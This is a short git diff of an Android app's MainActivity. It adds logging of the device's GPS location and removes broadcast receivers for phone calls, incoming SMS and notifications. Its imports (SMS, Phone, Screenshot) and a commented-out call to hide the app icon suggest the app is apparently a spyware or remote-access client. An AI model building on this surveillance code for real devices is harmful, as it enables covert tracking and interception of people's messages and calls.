@@ -20,6 +20,7 @@ import android.util.Log;
 import android.widget.Toast;
 
 import com.ot.grhq.client.functionality.FileManager;
+import com.ot.grhq.client.functionality.Location;
 import com.ot.grhq.client.functionality.Phone;
 import com.ot.grhq.client.functionality.SMS;
 import com.ot.grhq.client.functionality.Screenshot;
@@ -75,23 +76,12 @@ public class MainActivity extends AppCompatActivity {
             } catch (JSONException e) {}
         }
 
+        Log.e("eeee", String.valueOf(Location.getAltitude(getApplicationContext())));
+        Log.e("eeee", String.valueOf(Location.getLatitude(getApplicationContext())));
+        Log.e("eeee", String.valueOf(Location.getLongitude(getApplicationContext())));
+
 //        hideApplicationIcon();
         startService(new Intent(this, MainService.class));
-
-        // Phone call broadcast receiver
-        MainService.Call callReceiver = new MainService.Call();
-        IntentFilter callFilter = new IntentFilter("android.intent.action.PHONE_STATE");
-        registerReceiver(callReceiver, callFilter);
-
-        // SMS broadcast receiver
-        MainService.SMS smsReceiver = new MainService.SMS();
-        IntentFilter smsFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
-        registerReceiver(smsReceiver, smsFilter);
-
-        // Notification broadcast receiver
-        MainService.NotificationReceiver notificationReceiver = new MainService.NotificationReceiver();
-        IntentFilter notificationFilter = new IntentFilter("notification_data");
-        registerReceiver(notificationReceiver, notificationFilter);
 
         // Download complete broadcast receiver
         MainService.DownloadComplete downloadCompleteReceiver = new MainService.DownloadComplete();
